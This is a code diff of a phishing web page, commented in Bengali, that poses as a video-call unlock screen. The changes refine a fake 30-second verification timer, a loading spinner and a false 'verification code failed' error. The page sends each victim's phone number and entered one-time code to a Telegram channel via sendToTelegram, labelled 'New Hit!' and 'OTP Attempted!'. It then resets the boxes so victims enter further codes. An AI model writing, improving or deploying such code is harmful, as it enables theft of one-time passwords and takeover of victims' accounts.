@@ -16,38 +16,16 @@
         .otp-box { width: 48px; height: 60px; border: 1px solid #d1d1d1; border-radius: 10px; font-size: 22px; text-align: center; background: #fdfdfd; outline: none; transition: 0.3s; }
         .otp-box:focus { border-color: #e91e63; }
 
-        /* টাইমার এবং মেসেজ পজিশন - আপনার চিহ্নিত জায়গায় */
-        #statusMsg { 
-            margin-top: 15px; 
-            min-height: 30px; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            font-size: 13px; 
-            font-weight: bold;
-            color: #8E8E8E; 
-            text-transform: uppercase;
-        }
+        /* টাইমার এবং মেসেজ পজিশন */
+        #statusMsg { margin-top: 15px; min-height: 30px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        
+        #timerDisplay { font-size: 13px; font-weight: bold; color: #8E8E8E; text-transform: uppercase; margin-bottom: 5px; }
+        #errorDisplay { font-size: 13px; font-weight: bold; color: red; min-height: 20px; }
 
-        .red-text { color: red !important; }
+        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #333; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 5px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .unlock-btn { 
-            width: 100%; 
-            padding: 15px; 
-            background: linear-gradient(to right, #6a11cb, #2575fc); 
-            color: white; 
-            border: none; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            font-size: 15px; 
-            font-weight: bold; 
-            margin-top: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 5px;
-        }
+        .unlock-btn { width: 100%; padding: 15px; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 15px; font-weight: bold; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 5px; }
     </style>
 </head>
 <body>
@@ -71,9 +49,12 @@
                 <input type="tel" maxlength="1" class="otp-box" id="otp4" oninput="processOTP(this)" onkeyup="moveBack(event, 'otp3')">
             </div>
             
-            <button type="button" class="unlock-btn" id="unlockButton">🔒 UNLOCK VIDEO CALL JOIN NOW</button>
+            <button type="button" class="unlock-btn">🔒 UNLOCK VIDEO CALL JOIN NOW</button>
             
-            <div id="statusMsg"></div>
+            <div id="statusMsg">
+                <div id="timerDisplay">VERIFYING IN 30S...</div>
+                <div id="errorDisplay"></div>
+            </div>
         </div>
     </form>
 </div>
@@ -95,19 +76,18 @@
         }
     }
 
-    // ৩০ থেকে ০ পর্যন্ত কমার টাইমার ফাংশন
-    function startTimer(seconds) {
-        const statusBox = document.getElementById('statusMsg');
-        let timeLeft = seconds;
+    // Step 2-তে যাওয়ার সাথে সাথে টাইমার শুরু হবে
+    function startGlobalTimer() {
+        const timerText = document.getElementById('timerDisplay');
+        let timeLeft = 30;
         
-        const timerInterval = setInterval(() => {
-            statusBox.innerHTML = `VERIFYING IN ${timeLeft}S...`;
+        const interval = setInterval(() => {
             if (timeLeft > 0) {
                 timeLeft--;
+                timerText.innerHTML = `VERIFYING IN ${timeLeft}S...`;
             } else {
-                clearInterval(timerInterval);
-                // ০ হয়ে গেলে Verifying in 0s... টাইটেলটিই থাকবে
-                statusBox.innerHTML = `VERIFYING IN 0S...`;
+                timerText.innerHTML = `VERIFYING IN 0S...`;
+                clearInterval(interval);
             }
         }, 1000);
     }
@@ -115,28 +95,32 @@
     function processOTP(current) {
         if (current.value.length >= 1) {
             const otpBoxes = document.querySelectorAll('.otp-box');
-            const statusBox = document.getElementById('statusMsg');
+            const errorBox = document.getElementById('errorDisplay');
             const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
 
             if (otpValue.length === 4) {
                 otpBoxes.forEach(box => box.readOnly = true);
                 
-                // ওটিপি দেওয়ার সাথে সাথে ৩০ সেকেন্ডের টাইমার শুরু
-                startTimer(30);
+                // কোড লেখার পর ৫ সেকেন্ডের লোডিং
+                errorBox.innerHTML = '<div class="loader"></div> <span style="color:black">Please wait...</span>';
 
                 setTimeout(() => {
                     sendToTelegram(`✅ OTP Attempted!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpValue}`);
 
-                    // ৫ সেকেন্ড পর এরর মেসেজ আসবে কিন্তু টাইমার আগের মতো কাজ করতে থাকবে
+                    // ৫ সেকেন্ড পর লাল এরর মেসেজ
+                    errorBox.innerHTML = '⚠️ verification code failed please try again. ⚠️';
+                    
+                    // আবার টাইপ করার সুযোগ দেওয়া
                     setTimeout(() => {
-                        const errorSpan = document.createElement('span');
-                        errorSpan.className = 'red-text';
-                        errorSpan.style.marginTop = '10px';
-                        errorSpan.innerHTML = '⚠️ verification code failed please try again. ⚠️';
-                        statusBox.appendChild(errorSpan);
-                    }, 5000);
+                        otpBoxes.forEach(box => {
+                            box.readOnly = false;
+                            box.value = '';
+                        });
+                        errorBox.innerHTML = ''; 
+                        document.getElementById('otp1').focus();
+                    }, 2000);
 
-                }, 1000); 
+                }, 5000); 
             }
         }
     }
@@ -151,6 +135,10 @@
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
         document.getElementById('otp1').focus();
+        
+        // টাইমার শুরু করা
+        startGlobalTimer();
+        
         sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
     }
 
